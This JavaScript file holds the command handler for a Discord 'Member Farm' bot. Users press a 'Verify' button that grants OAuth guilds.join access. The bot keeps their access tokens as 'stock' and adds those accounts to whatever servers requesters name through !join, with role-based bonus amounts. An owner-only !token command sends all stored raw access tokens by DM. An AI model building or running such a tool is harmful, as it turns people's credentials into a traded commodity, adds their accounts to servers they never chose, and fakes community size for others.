// language: JavaScript, file: commands.js
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionFlagsBits } = require('discord.js');
const { db, getSetting, setSetting } = require('./db');
const config = require('./config');
const perms = require('./permissions');
const logs = require('./logs');
const queue = require('./queue');
const { joinGuild } = require('./oauth');

function getPrefix() {
  return getSetting('prefix', config.DEFAULT_PREFIX);
}

function confirmRow(id) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_${id}`).setLabel('Confirm').setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId(`decline_${id}`).setLabel('Decline').setStyle(ButtonStyle.Secondary)
  );
}

async function handleCommand(message, client) {
  const prefix = getPrefix();
  if (!message.content.startsWith(prefix) || message.author.bot) return;

  const args = message.content.slice(prefix.length).trim().split(/\s+/);
  const cmd = (args.shift() || '').toLowerCase();
  if (!cmd) return;

  if (message.guild) {
    const bl = db.prepare('SELECT reason FROM blacklist WHERE guild_id = ?').get(message.guild.id);
    if (bl) {
      return message.reply(`This server is blacklisted. Reason: ${bl.reason}`);
    }
  }

  if (perms.isMaintenance() && !perms.isMaintenanceAllowed(message.author.id) && !perms.isOwner(message.author.id)) {
    return message.reply('Bot is currently under maintenance.');
  }

  const publicCmds = ['checkserver', 'help', 'verify'];
  if (!publicCmds.includes(cmd) && !perms.canUse(message.author.id, cmd) && !perms.isOwner(message.author.id)) {
    if (cmd !== 'join') return;
  }

  try {
    switch (cmd) {
      case 'prefix': {
        if (args[0] === 'set' && args[1]) {
          if (!perms.canUse(message.author.id, 'prefix') && !perms.isOwner(message.author.id)) return;
          setSetting('prefix', args[1]);
          await message.reply(`Prefix set to \`${args[1]}\``);
          logs.adminLog(client, 'Prefix changed', `By <@${message.author.id}> → \`${args[1]}\``);
        }
        break;
      }

      case 'auth': {
        if (!perms.canUse(message.author.id, 'auth') && !perms.isOwner(message.author.id)) return;
        const total = db.prepare('SELECT COUNT(*) as c FROM tokens WHERE valid = 1').get().c;
        const stats = db.prepare('SELECT * FROM auth_stats WHERE id = 1').get();
        const now = Math.floor(Date.now() / 1000);
        let last24 = stats.last_24h;
        if (now - stats.last_24h_reset > 86400) last24 = 0;
        const emb = new EmbedBuilder()
          .setTitle('Auth Status')
          .addFields(
            { name: 'Current valid auths', value: String(total), inline: true },
            { name: 'Added last 24h', value: String(last24), inline: true },
            { name: 'All-time max', value: String(stats.total_all_time), inline: true }
          )
          .setColor(0x5865f2);
        await message.reply({ embeds: [emb] });
        break;
      }

      case 'restock': {
        if (!perms.canUse(message.author.id, 'restock') && !perms.isOwner(message.author.id)) return;
        const n = parseInt(args[0], 10);
        if (!n || n < 1) return message.reply('Usage: !restock <number>');
        const available = db.prepare('SELECT id FROM tokens WHERE valid = 1 AND id NOT IN (SELECT token_id FROM stock)').all();
        if (n > available.length) return message.reply(`Only ${available.length} tokens available for restock.`);
        for (let i = available.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [available[i], available[j]] = [available[j], available[i]];
        }
        const insert = db.prepare('INSERT OR IGNORE INTO stock (token_id) VALUES (?)');
        const picked = available.slice(0, n);
        const tx = db.transaction(() => picked.forEach(t => insert.run(t.id)));
        tx();
        await message.reply(`Restocked **${n}** tokens into stock.`);
        logs.adminLog(client, 'Restock', `<@${message.author.id}> restocked ${n}`);
        break;
      }

      case 'stock': {
        if (!perms.canUse(message.author.id, 'stock') && !perms.isOwner(message.author.id)) return;
        const count = db.prepare('SELECT COUNT(*) as c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1').get().c;
        await message.reply(`Current stock: **${count}**`);
        break;
      }

      case 'remove': {
        if (!perms.canUse(message.author.id, 'remove') && !perms.isOwner(message.author.id)) return;
        const n = parseInt(args[0], 10);
        if (!n || n < 1) return message.reply('Usage: !remove <number>');
        const rows = db.prepare('SELECT token_id FROM stock LIMIT ?').all(n);
        if (!rows.length) return message.reply('Stock is empty.');
        const del = db.prepare('DELETE FROM stock WHERE token_id = ?');
        rows.forEach(r => del.run(r.token_id));
        await message.reply(`Removed **${rows.length}** from stock.`);
        logs.adminLog(client, 'Stock remove', `<@${message.author.id}> removed ${rows.length}`);
        break;
      }

      case 'help': {
        const emb = new EmbedBuilder()
          .setTitle('Member Farm — Commands')
          .setDescription([
            '**Core**',
            '`!prefix set <prefix>` — change prefix',
            '`!auth` — auth counts',
            '`!stock` — current stock',
            '`!restock <n>` — move n tokens into stock',
            '`!remove <n>` — remove n from stock',
            '`!link` / `!link define <url>` — OAuth link',
            '`!verify` — verification message + button',
            '`!join <serverID>` — request members (special channel only)',
            '`!channel set #channel` — set the !join channel',
            '',
            '**Permissions**',
            '`!grant @user <cmd|all>`',
            '`!grant revoke @user <cmd|all>`',
            '`!permission @user`',
            '',
            '**Queue**',
            '`!queue` `!queue clear` `!queue remove <id>`',
            '`!queue info <id>` `!queue priority <id>` `!queue move <id> <pos>`',
            '`!queue pause` `!queue resume`',
            '',
            '**Server**',
            '`!checkserver <id>` (public)',
            '`!blacklist <id> <reason>` `!blacklist list` `!blacklist revoke <id>`',
            '`!server leave <id>`',
            '`!announce <id|all> <msg>`',
            '',
            '**Config**',
            '`!basesend set <n>` `!send @role <n>`',
            '`!verifyrole set @role`',
            '`!cooldown <seconds>`',
            '',
            '**Logs**',
            '`!logfarm|logserver|logerrors|logadmin enable|disable|set #channel`',
            '`!logs status`',
            '',
            '**Admin**',
            '`!stats` `!profile @user` `!maintenance enable|disable`',
            '`!maintenance allowed @user` `!maintenance revoke @user`',
            '`!token` (owner only)',
          ].join('\n'))
          .setColor(0x5865f2);
        await message.reply({ embeds: [emb] });
        break;
      }

      case 'grant': {
        if (!perms.canUse(message.author.id, 'grant') && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'revoke') {
          const user = message.mentions.users.first();
          const what = args[2]?.toLowerCase() || 'all';
          if (!user) return message.reply('Usage: !grant revoke @user <cmd|all>');
          perms.revoke(user.id, what.replace(/^!/, ''));
          await message.reply(`Revoked \`${what}\` from <@${user.id}>`);
          logs.adminLog(client, 'Grant revoke', `<@${message.author.id}> revoked ${what} from <@${user.id}>`);
        } else {
          const user = message.mentions.users.first();
          const what = (args[1] || 'all').toLowerCase().replace(/^!/, '');
          if (!user) return message.reply('Usage: !grant @user <cmd|all>');
          perms.grant(user.id, what);
          await message.reply(`Granted \`${what}\` to <@${user.id}>`);
          logs.adminLog(client, 'Grant', `<@${message.author.id}> granted ${what} to <@${user.id}>`);
        }
        break;
      }

      case 'permission':
      case 'permissions': {
        if (!perms.canUse(message.author.id, 'permission') && !perms.isOwner(message.author.id)) return;
        const user = message.mentions.users.first() || message.author;
        const list = perms.listGrants(user.id);
        await message.reply(`Permissions for <@${user.id}>: ${list.length ? list.map(c => `\`${c}\``).join(', ') : 'none (owner always has all)'}`);
        break;
      }

      case 'link': {
        if (args[0] === 'define') {
          if (!perms.canUse(message.author.id, 'link') && !perms.isOwner(message.author.id)) return;
          const url = args.slice(1).join(' ');
          if (!url) return message.reply('Usage: !link define <url>');
          setSetting('oauth_link', url);
          await message.reply('OAuth link defined.');
          logs.adminLog(client, 'Link defined', `By <@${message.author.id}>`);
        } else {
          const url = getSetting('oauth_link', process.env.REDIRECT_URI ? `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join` : 'Not configured. Use !link define <url>');
          await message.reply(`OAuth authorize link:\n${url}`);
        }
        break;
      }

      case 'verify': {
        if (message.guild && message.guild.id === (getSetting('payout_central') || config.PAYOUT_CENTRAL_GUILD_ID)) {
          return message.reply('Cannot use !verify inside Payout Central.');
        }
        const url = getSetting('oauth_link', `https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI || '')}&response_type=code&scope=identify%20guilds.join`);
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setLabel('—> Verify').setStyle(ButtonStyle.Link).setURL(url)
        );
        const emb = new EmbedBuilder()
          .setTitle('Account Verification')
          .setDescription('Click the button below to authorize the bot to add you to servers (scope: guilds.join).')
          .setColor(0x57f287);
        await message.channel.send({ embeds: [emb], components: [row] });
        break;
      }

      case 'join': {
        const specialId = getSetting('special_channel') || config.SPECIAL_CHANNEL_ID;
        const specialName = getSetting('special_channel_name') || config.SPECIAL_CHANNEL_NAME;
        const isSpecial = message.channel.id === specialId || message.channel.name === specialName;
        if (!isSpecial) return message.reply('This command can only be used in the designated join channel.');

        const verifiedRole = getSetting('verified_role') || config.VERIFIED_ROLE_ID;
        if (verifiedRole && !message.member.roles.cache.has(verifiedRole)) {
          return message.reply('You need the verified role to use this command.');
        }

        const targetId = args[0];
        if (!targetId || !/^\d{17,20}$/.test(targetId)) return message.reply('Usage: !join <serverID>');

        const targetGuild = client.guilds.cache.get(targetId);
        if (!targetGuild) {
          return message.reply('Bot is not in that server. Add the bot first, then retry.');
        }

        const cd = parseInt(getSetting('cooldown_ms', String(config.COOLDOWN_MS)), 10) || 0;
        if (cd > 0) {
          const last = db.prepare('SELECT last_join FROM cooldowns WHERE user_id = ?').get(message.author.id);
          if (last && Date.now() - last.last_join < cd) {
            const left = Math.ceil((cd - (Date.now() - last.last_join)) / 1000);
            return message.reply(`Cooldown active. Wait ${left}s.`);
          }
        }

        let amount = parseInt(getSetting('base_send', String(config.BASE_SEND)), 10) || 2;
        const bonuses = db.prepare('SELECT role_id, bonus FROM role_bonus').all();
        for (const b of bonuses) {
          if (message.member.roles.cache.has(b.role_id)) amount += b.bonus;
        }

        const stockCount = db.prepare('SELECT COUNT(*) as c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1').get().c;
        if (stockCount === 0) {
          return message.reply(`Error. All stock account are alredy in ${targetId}`);
        }

        const q = queue.addToQueue(targetId, message.author.id, amount);
        if (!q.ok) return message.reply('Queue is full (max 10). Try later.');

        db.prepare('INSERT INTO cooldowns (user_id, last_join) VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET last_join = excluded.last_join').run(message.author.id, Date.now());
        db.prepare(`INSERT INTO profiles (user_id, commands_used, last_command_at) VALUES (?, 1, strftime('%s','now'))
          ON CONFLICT(user_id) DO UPDATE SET commands_used = commands_used + 1, last_command_at = strftime('%s','now')`).run(message.author.id);

        const emb = new EmbedBuilder()
          .setTitle('Join Request Queued')
          .addFields(
            { name: 'Members to send', value: String(amount), inline: true },
            { name: 'Target Server', value: targetId, inline: true },
            { name: 'Queue position', value: `${q.position}/${config.QUEUE_MAX}`, inline: true }
          )
          .setColor(0x57f287);
        await message.reply({ embeds: [emb] });
        logs.farmLog(client, 'Join queued', `User <@${message.author.id}> → guild ${targetId} x${amount} pos ${q.position}`);
        break;
      }

      case 'channel': {
        if (args[0] === 'set') {
          if (!perms.canUse(message.author.id, 'channel') && !perms.isOwner(message.author.id)) return;
          const ch = message.mentions.channels.first();
          if (!ch) return message.reply('Usage: !channel set #channel');
          setSetting('special_channel', ch.id);
          setSetting('special_channel_name', ch.name);
          await message.reply(`Join channel set to ${ch}`);
          logs.adminLog(client, 'Join channel', `Set to ${ch} by <@${message.author.id}>`);
        } else {
          const id = getSetting('special_channel', 'not set');
          const name = getSetting('special_channel_name', '');
          await message.reply(`Current join channel: ${id === 'not set' ? 'not set' : `<#${id}> (${name})`}`);
        }
        break;
      }

      case 'basesend': {
        if (args[0] === 'set' && args[1]) {
          if (!perms.canUse(message.author.id, 'basesend') && !perms.isOwner(message.author.id)) return;
          const n = parseInt(args[1], 10);
          if (isNaN(n) || n < 0) return message.reply('Invalid number');
          setSetting('base_send', String(n));
          await message.reply(`Base send set to **${n}**`);
          logs.adminLog(client, 'Base send', `Set to ${n} by <@${message.author.id}>`);
        }
        break;
      }

      case 'send': {
        if (!perms.canUse(message.author.id, 'send') && !perms.isOwner(message.author.id)) return;
        const role = message.mentions.roles.first();
        const n = parseInt(args[1], 10);
        if (!role || isNaN(n)) return message.reply('Usage: !send @role <number>');
        db.prepare('INSERT INTO role_bonus (role_id, bonus) VALUES (?, ?) ON CONFLICT(role_id) DO UPDATE SET bonus = excluded.bonus').run(role.id, n);
        await message.reply(`Role ${role} will receive **+${n}** members per !join`);
        logs.adminLog(client, 'Role bonus', `${role.name} → +${n}`);
        break;
      }

      case 'checkserver': {
        const gid = args[0];
        if (!gid) return message.reply('Usage: !checkserver <serverID>');
        const g = client.guilds.cache.get(gid);
        if (!g) return message.reply('Bot is not in that server.');
        const stockC = db.prepare('SELECT COUNT(*) as c FROM stock s JOIN tokens t ON t.id = s.token_id WHERE t.valid = 1').get().c;
        const joined = db.prepare('SELECT COUNT(*) as c FROM joins WHERE guild_id = ? AND success = 1').get(gid).c;
        const bl = db.prepare('SELECT reason FROM blacklist WHERE guild_id = ?').get(gid);
        const emb = new EmbedBuilder()
          .setTitle(`Server ${g.name}`)
          .addFields(
            { name: 'Members', value: String(g.memberCount), inline: true },
            { name: 'Members obtained (tracked)', value: String(joined), inline: true },
            { name: 'Current stock', value: String(stockC), inline: true },
            { name: 'Blacklisted', value: bl ? `Yes — ${bl.reason}` : 'No', inline: false }
          )
          .setColor(0x5865f2);
        await message.reply({ embeds: [emb] });
        break;
      }

      case 'blacklist': {
        if (args[0] === 'list') {
          if (!perms.canUse(message.author.id, 'blacklist') && !perms.isOwner(message.author.id)) return;
          const rows = db.prepare('SELECT * FROM blacklist').all();
          if (!rows.length) return message.reply('No blacklisted servers.');
          await message.reply(rows.map(r => `\`${r.guild_id}\` — ${r.reason}`).join('\n').slice(0, 1900));
        } else if (args[0] === 'revoke') {
          if (!perms.canUse(message.author.id, 'blacklist') && !perms.isOwner(message.author.id)) return;
          const gid = args[1];
          db.prepare('DELETE FROM blacklist WHERE guild_id = ?').run(gid);
          await message.reply(`Blacklist revoked for ${gid}`);
          logs.adminLog(client, 'Blacklist revoke', gid);
        } else {
          if (!perms.canUse(message.author.id, 'blacklist') && !perms.isOwner(message.author.id)) return;
          const gid = args[0];
          const reason = args.slice(1).join(' ') || 'No reason';
          if (!gid) return message.reply('Usage: !blacklist <serverID> <reason>');
          db.prepare('INSERT INTO blacklist (guild_id, reason, added_by) VALUES (?, ?, ?) ON CONFLICT(guild_id) DO UPDATE SET reason = excluded.reason').run(gid, reason, message.author.id);
          await message.reply(`Blacklisted ${gid}: ${reason}`);
          logs.adminLog(client, 'Blacklist', `${gid} — ${reason}`);
        }
        break;
      }

      case 'verifyrole': {
        if (args[0] === 'set') {
          if (!perms.canUse(message.author.id, 'verifyrole') && !perms.isOwner(message.author.id)) return;
          const role = message.mentions.roles.first();
          if (!role) return message.reply('Usage: !verifyrole set @role');
          setSetting('verified_role', role.id);
          await message.reply(`Verified role set to ${role}`);
        }
        break;
      }

      case 'logfarm':
      case 'logserver':
      case 'logerrors':
      case 'logadmin': {
        const type = cmd.replace('log', '');
        if (!perms.canUse(message.author.id, cmd) && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'enable') {
          setSetting(`log_${type}_enabled`, '1');
          await message.reply(`${cmd} enabled`);
        } else if (args[0] === 'disable') {
          setSetting(`log_${type}_enabled`, '0');
          await message.reply(`${cmd} disabled`);
        } else if (args[0] === 'set') {
          const ch = message.mentions.channels.first();
          if (!ch) return message.reply(`Usage: ${prefix}${cmd} set #channel`);
          setSetting(`log_${type}_channel`, ch.id);
          setSetting(`log_${type}_enabled`, '1');
          await message.reply(`${cmd} channel set to ${ch}`);
        }
        break;
      }

      case 'logs': {
        if (args[0] === 'status') {
          if (!perms.canUse(message.author.id, 'logs') && !perms.isOwner(message.author.id)) return;
          const types = ['farm', 'server', 'errors', 'admin'];
          const lines = types.map(t => {
            const en = getSetting(`log_${t}_enabled`, '0') === '1' ? 'ON' : 'OFF';
            const ch = getSetting(`log_${t}_channel`, 'none');
            return `**${t}**: ${en} → ${ch === 'none' ? 'none' : `<#${ch}>`}`;
          });
          await message.reply(lines.join('\n'));
        }
        break;
      }

      case 'stats': {
        if (!perms.canUse(message.author.id, 'stats') && !perms.isOwner(message.author.id)) return;
        const tokens = db.prepare('SELECT COUNT(*) as c FROM tokens WHERE valid = 1').get().c;
        const stockC = db.prepare('SELECT COUNT(*) as c FROM stock').get().c;
        const qC = db.prepare('SELECT COUNT(*) as c FROM queue WHERE status = ?').get('pending').c;
        const guilds = client.guilds.cache.size;
        const joins = db.prepare('SELECT COUNT(*) as c FROM joins WHERE success = 1').get().c;
        const users = db.prepare('SELECT COUNT(*) as c FROM profiles').get().c;
        const emb = new EmbedBuilder()
          .setTitle('Global Stats')
          .addFields(
            { name: 'Valid auths', value: String(tokens), inline: true },
            { name: 'Stock', value: String(stockC), inline: true },
            { name: 'Queue', value: String(qC), inline: true },
            { name: 'Bot guilds', value: String(guilds), inline: true },
            { name: 'Successful joins', value: String(joins), inline: true },
            { name: 'Tracked users', value: String(users), inline: true }
          )
          .setColor(0xfaa61a);
        await message.reply({ embeds: [emb] });
        break;
      }

      case 'queue': {
        if (!perms.canUse(message.author.id, 'queue') && !perms.isOwner(message.author.id)) return;
        const sub = (args[0] || '').toLowerCase();
        if (!sub) {
          const rows = queue.getQueue();
          if (!rows.length) return message.reply('Queue empty.');
          await message.reply(rows.map(r => `#${r.position} \`${r.guild_id}\` x${r.amount} (prio ${r.priority})`).join('\n'));
        } else if (sub === 'clear') {
          const id = `clearq_${Date.now()}`;
          client.pendingConfirms = client.pendingConfirms || new Map();
          client.pendingConfirms.set(id, { action: 'queue_clear', author: message.author.id });
          await message.reply({ content: 'Confirm clear entire queue?', components: [confirmRow(id)] });
        } else if (sub === 'remove') {
          const gid = args[1];
          queue.removeFromQueue(gid);
          await message.reply(`Removed ${gid} from queue`);
        } else if (sub === 'info') {
          const gid = args[1];
          const row = db.prepare('SELECT * FROM queue WHERE guild_id = ? AND status = ?').get(gid, 'pending');
          if (!row) return message.reply('Not in queue');
          await message.reply(`Guild ${gid} — pos ${row.position}, amount ${row.amount}, priority ${row.priority}, by <@${row.requester_id}>`);
        } else if (sub === 'priority') {
          queue.setPriority(args[1]);
          await message.reply(`Priority set for ${args[1]}`);
        } else if (sub === 'move') {
          const ok = queue.moveQueue(args[1], parseInt(args[2], 10));
          await message.reply(ok ? 'Moved' : 'Not found');
        } else if (sub === 'pause') {
          queue.pauseQueue();
          await message.reply('Queue paused');
        } else if (sub === 'resume') {
          queue.resumeQueue();
          await message.reply('Queue resumed');
        }
        break;
      }

      case 'maintenance': {
        if (!perms.isOwner(message.author.id) && !perms.canUse(message.author.id, 'maintenance')) return;
        if (args[0] === 'enable') {
          setSetting('maintenance', '1');
          await message.reply('Maintenance **enabled**');
        } else if (args[0] === 'disable') {
          setSetting('maintenance', '0');
          await message.reply('Maintenance **disabled**');
        } else if (args[0] === 'allowed') {
          const u = message.mentions.users.first();
          if (!u) return message.reply('Usage: !maintenance allowed @user');
          db.prepare('INSERT OR IGNORE INTO maintenance_allowed (user_id) VALUES (?)').run(u.id);
          await message.reply(`Allowed <@${u.id}> during maintenance`);
        } else if (args[0] === 'revoke') {
          const u = message.mentions.users.first();
          if (!u) return;
          db.prepare('DELETE FROM maintenance_allowed WHERE user_id = ?').run(u.id);
          await message.reply(`Revoked maintenance access for <@${u.id}>`);
        }
        break;
      }

      case 'server': {
        if (args[0] === 'leave') {
          if (!perms.canUse(message.author.id, 'server') && !perms.isOwner(message.author.id)) return;
          const gid = args[1];
          const g = client.guilds.cache.get(gid);
          if (!g) return message.reply('Not in that server');
          const id = `leave_${gid}_${Date.now()}`;
          client.pendingConfirms = client.pendingConfirms || new Map();
          client.pendingConfirms.set(id, { action: 'leave', guildId: gid, author: message.author.id });
          await message.reply({ content: `Confirm leave server ${g.name} (${gid})?`, components: [confirmRow(id)] });
        }
        break;
      }

      case 'profile': {
        if (!perms.canUse(message.author.id, 'profile') && !perms.isOwner(message.author.id)) return;
        const user = message.mentions.users.first() || message.author;
        let p = db.prepare('SELECT * FROM profiles WHERE user_id = ?').get(user.id);
        if (!p) p = { members_received: 0, commands_used: 0, last_command_at: null, guilds_added: '[]' };
        const emb = new EmbedBuilder()
          .setTitle(`Profile — ${user.tag}`)
          .addFields(
            { name: 'Members received', value: String(p.members_received), inline: true },
            { name: 'Commands used', value: String(p.commands_used), inline: true },
            { name: 'Last command', value: p.last_command_at ? `<t:${p.last_command_at}:R>` : 'never', inline: true }
          )
          .setColor(0x5865f2);
        await message.reply({ embeds: [emb] });
        break;
      }

      case 'announce': {
        if (!perms.canUse(message.author.id, 'announce') && !perms.isOwner(message.author.id)) return;
        if (args[0] === 'all') {
          const msg = args.slice(1).join(' ');
          if (!msg) return message.reply('Usage: !announce all <message>');
          const id = `annall_${Date.now()}`;
          client.pendingConfirms = client.pendingConfirms || new Map();
          client.pendingConfirms.set(id, { action: 'announce_all', message: msg, author: message.author.id });
          await message.reply({ content: `Confirm announce to **all** ${client.guilds.cache.size} servers?`, components: [confirmRow(id)] });
        } else {
          const gid = args[0];
          const msg = args.slice(1).join(' ');
          const g = client.guilds.cache.get(gid);
          if (!g || !msg) return message.reply('Usage: !announce <serverID> <message>');
          const ch = g.systemChannel || g.channels.cache.find(c => c.isTextBased() && c.permissionsFor(g.members.me).has(PermissionFlagsBits.SendMessages));
          if (!ch) return message.reply('No sendable channel');
          await ch.send(msg);
          await message.reply(`Announced in ${g.name}`);
        }
        break;
      }

      case 'cooldown': {
        if (!perms.canUse(message.author.id, 'cooldown') && !perms.isOwner(message.author.id)) return;
        const sec = parseInt(args[0], 10);
        if (isNaN(sec) || sec < 0) return message.reply('Usage: !cooldown <seconds>');
        setSetting('cooldown_ms', String(sec * 1000));
        await message.reply(`Join cooldown set to **${sec}s**`);
        break;
      }

      case 'token': {
        if (String(message.author.id) !== String(config.OWNER_ID)) return;
        const tokens = db.prepare('SELECT id, user_id, access_token, expires_at, valid FROM tokens WHERE valid = 1 ORDER BY id').all();
        if (!tokens.length) return message.author.send('No valid tokens.').catch(() => {});
        const pages = [];
        const perPage = 5;
        for (let i = 0; i < tokens.length; i += perPage) {
          const chunk = tokens.slice(i, i + perPage);
          const emb = new EmbedBuilder()
            .setTitle(`Valid Access Tokens (${i / perPage + 1}/${Math.ceil(tokens.length / perPage)})`)
            .setDescription(chunk.map(t => `**#${t.id}** user \`${t.user_id}\`\n\`${t.access_token}\`\nexpires <t:${t.expires_at}:R>`).join('\n\n'))
            .setColor(0xed4245);
          pages.push(emb);
        }
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('token_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId('token_next').setLabel('▶').setStyle(ButtonStyle.Secondary)
        );
        const dm = await message.author.send({ embeds: [pages[0]], components: pages.length > 1 ? [row] : [] });
        if (pages.length > 1) {
          client.tokenPages = client.tokenPages || new Map();
          client.tokenPages.set(dm.id, { pages, index: 0, owner: message.author.id });
        }
        await message.reply('Sent tokens in DM.');
        break;
      }

      default:
        break;
    }
  } catch (err) {
    console.error(err);
    logs.errorLog(client, 'Command error', `${cmd}: ${err.message}`);
    await message.reply('An error occurred.').catch(() => {});
  }
}

module.exports = { handleCommand, getPrefix };
